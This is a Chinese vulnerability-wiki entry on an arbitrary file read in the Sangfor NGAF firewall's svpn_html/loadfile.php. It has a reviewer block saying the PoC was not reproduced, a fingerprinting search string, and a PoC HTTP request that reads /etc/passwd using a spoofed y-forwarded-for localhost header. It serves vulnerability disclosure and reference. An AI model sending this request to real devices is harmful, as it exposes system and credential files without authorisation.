---
source: "Threekiii/Vulnerability-Wiki"
id: "vw-a7c293abefcaa4dd9494a4bc"
entity_id: "ve-a7c293abefcaa4dd9494a4bc"
schema_version: "1"
title: "深信服 NGAF下一代防火墙 loadfile.php 任意文件读取漏洞"
product: "Sangfor NGAF"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "y-forwarded-for伪本地，无Cookie，版本未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E6%B7%B1%E4%BF%A1%E6%9C%8DNGAF/%E6%B7%B1%E4%BF%A1%E6%9C%8D-NGAF%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-loadfile.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要且已脱敏的响应，不能由接口可达推定敏感内容已泄露"
source_status: "unknown"
canonical: "Web安全/安全设备/深信服NGAF/深信服-NGAF下一代防火墙-loadfile.php-任意文件读取漏洞.md"
---

# 深信服 NGAF下一代防火墙 loadfile.php 任意文件读取漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Sangfor NGAF
- 本文讨论：svpn_html/loadfile.php文件读取
- 版本、权限与配置前提：y-forwarded-for伪本地，无Cookie，版本未知
- 资料类型：文件读取请求复现；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 非标准y-forwarded-for安全意义未解释，版本/修复缺失
- 与网络设备同文入口跨分类重复
- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要且已脱敏的响应，不能由接口可达推定敏感内容已泄露

### 待核与来源

- 头部必要性、响应与固件待核
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


## 漏洞描述

深信服下一代防火墙是一款以应用安全需求出发而设计的下一代应用防火墙。深信服下一代防火墙在 loadfile.php 处存在文件读取漏洞，攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等。

## 漏洞影响

深信服 NGAF下一代防火墙

## 网络测绘

```
"Redirect.php?url=LogInOut.php"
```

## 漏洞复现

登陆页面

![image-20231115101204343](./.resource/深信服-NGAF下一代防火墙-loadfile.php-任意文件读取漏洞/media/image-20231115101204343.png)

poc

```http
GET /svpn_html/loadfile.php?file=/etc/./passwd HTTP/1.1
Host: 
User-Agent: Opera/8.90.(Windows NT 6.0; is-IS) Presto/2.9.177 Version/10.00
Accept-Encoding: gzip, deflate
Accept: */*
y-forwarded-for: 127.0.0.1
```

![image-20231115101759670](./.resource/深信服-NGAF下一代防火墙-loadfile.php-任意文件读取漏洞/media/image-20231115101759670.png)

---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
